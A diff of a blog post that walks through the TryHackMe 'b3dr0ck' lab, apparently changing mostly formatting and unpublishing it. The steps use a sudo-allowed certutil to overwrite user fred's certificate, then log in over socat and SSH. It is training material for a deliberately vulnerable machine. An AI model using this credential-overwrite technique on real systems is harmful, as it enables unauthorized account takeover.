@@ -7,7 +7,7 @@ description: >-
   authorization and more!
 image: /assets/img/b3dr0ck/gazoo.png
 permalink: /blog/thm-b3dr0ck/
-published: true
+published: false
 categories:
   - tryhackme
   - hacking
@@ -223,9 +223,10 @@ User barney may run the following commands on b3dr0ck:
     (ALL : ALL) /usr/bin/certutil
 </pre>
 </li>
-<li>Ok, so we can use sudo on&nbsp;<strong>certutil</strong>, let's check it out <br /> <img src="/assets/img/check-it-out-steve-brule.gif" /></li>
+<li>Ok, so we can use sudo on&nbsp;<strong>certutil</strong>, let's check it out <br /><img src="/assets/img/check-it-out-steve-brule.gif" /></li>
 <li>Try to run <strong>sudo certutil</strong> by itself to start with</li>
-<li><pre>barney@b3dr0ck:~$ sudo certutil
+<li>
+<pre>barney@b3dr0ck:~$ sudo certutil
 
 Cert Tool Usage:
 ----------------
@@ -235,10 +236,10 @@ Show current certs:
 
 Generate new keypair:
   certutil [username] [fullname]
-</pre></li>
+</pre>
+</li>
 <li>Ok cool, so this is some sort of tool to view and create keypair credentials</li>
 <li>Let's try the <strong>sudo certutil ls</strong> first</li>
-
 <li>
 <pre>barney@b3dr0ck:~$ sudo certutil ls
 
@@ -259,7 +260,8 @@ drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
 </li>
 <li>Ok now we know where and how these keys/certs are managed</li>
 <li>Let's try to create a new keypair!</li>
-<li><pre>barney@b3dr0ck:~$ sudo certutil f11snipe "F11snipe FTW"
+<li>
+<pre>barney@b3dr0ck:~$ sudo certutil f11snipe "F11snipe FTW"
 Generating credentials for user: f11snipe (F11snipe FTW)
 Generated: clientKey for f11snipe: /usr/share/abc/certs/f11snipe.clientKey.pem
 Generated: certificate for f11snipe: /usr/share/abc/certs/f11snipe.certificate.pem
@@ -278,9 +280,11 @@ Generated: certificate for f11snipe: /usr/share/abc/certs/f11snipe.certificate.p
 ****************************************************************
 ********
 -----END CERTIFICATE-----
-</pre></li>
+</pre>
+</li>
 <li>Nice! We've generated a fresh pair of credentials for a new user. Let's check <strong>certutil ls</strong> to see what it actually did</li>
-<li><pre>barney@b3dr0ck:~$ sudo certutil ls
+<li>
+<pre>barney@b3dr0ck:~$ sudo certutil ls
 
 Current Cert List: (/usr/share/abc/certs)
 ------------------
@@ -299,12 +303,13 @@ drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
 -rw-r----- 1 root root 1678 Apr 30 21:05 fred.clientKey.pem
 -rw-r----- 1 root root  898 Apr 30 21:05 fred.csr.pem
 -rw-r----- 1 root root 1678 Apr 30 21:05 fred.serviceKey.pem
-</pre></li>
-
+</pre>
+</li>
 <li>So we see 4 new files for our <strong>f11snipe</strong> user.</li>
 <li>Based on the output from the create command, we know the "pair" we need is <strong>.certificate.pem</strong> and <strong>.clientKey.pem</strong></li>
 <li>Let's connect to port <strong>54321</strong> with these creds and see what happens!</li>
-<li><pre>socat stdio ssl:$VMIP:54321,cert=f11snipe.cert,key=f11snipe.key,verify=0
+<li>
+<pre>socat stdio ssl:$VMIP:54321,cert=f11snipe.cert,key=f11snipe.key,verify=0
 
 
  __     __   _     _             _____        _     _             _____        _ 
@@ -317,14 +322,16 @@ drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
                                                                                  
 
 Welcome: 'F11snipe FTW' is authorized.
-b3dr0ck> help
+b3dr0ck&gt; help
 Password hint: none (user = 'F11snipe FTW')
-b3dr0ck> 
-</pre></li>
+b3dr0ck&gt; 
+</pre>
+</li>
 <li>Yay, We're in with our new credentials! But it looks like the hint is empty (new user)</li>
 <li>Let's see if we can get here as user <strong>fred</strong></li>
 <li>Back to <strong>certutil</strong>, let's try to overwrite fred's credentials with new ones we have access to</li>
-<li><pre>barney@b3dr0ck:~$ sudo certutil fred "Fred Flintstone"
+<li>
+<pre>barney@b3dr0ck:~$ sudo certutil fred "Fred Flintstone"
 Generating credentials for user: fred (Fred Flintstone)
 Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
 Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
@@ -343,11 +350,12 @@ Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
 ****************************************************************
 ********
 -----END CERTIFICATE-----
-</pre></li>
-
+</pre>
+</li>
 <li>It worked! The <strong>certutil</strong> tool doesn't validate or block on duplicate user/file names.</li>
 <li>Let's connect again to port <strong>54321</strong> as fred with these creds</li>
-<li><pre>socat stdio ssl:$VMIP:54321,cert=fred.cert,key=fred.key,verify=0
+<li>
+<pre>socat stdio ssl:$VMIP:54321,cert=fred.cert,key=fred.key,verify=0
 
 
  __     __   _     _             _____        _     _             _____        _ 
@@ -360,19 +368,20 @@ Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
                                                                                  
 
 Welcome: 'Fred Flintstone' is authorized.
-b3dr0ck> help
+b3dr0ck&gt; help
 Password hint: **************** (user = 'Fred Flintstone')
-b3dr0ck> 
-</pre></li>
-
+b3dr0ck&gt; 
+</pre>
+</li>
 <li>There we go! Let's try ssh as <strong>fred</strong> now...</li>
-<li><pre>ssh fred@$VMIP  
+<li>
+<pre>ssh fred@$VMIP  
 fred@10.10.215.234's password: 
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
 
 fred@b3dr0ck:~$ 
-</pre></li>
-
+</pre>
+</li>
 <li>
 <p>We're in as&nbsp;<strong>fred</strong>! Let's get next flag:&nbsp;<strong>fred.txt</strong></p>
 </li>
@@ -452,4 +461,3 @@ THM{***}</pre>
 </li>
 </ul>
 <p>Signup for TryHackMe today! <a title="Try Hack Me Homepage" href="https://tryhackme.com/" target="_blank" rel="noopener">tryhackme.com</a></p>
-
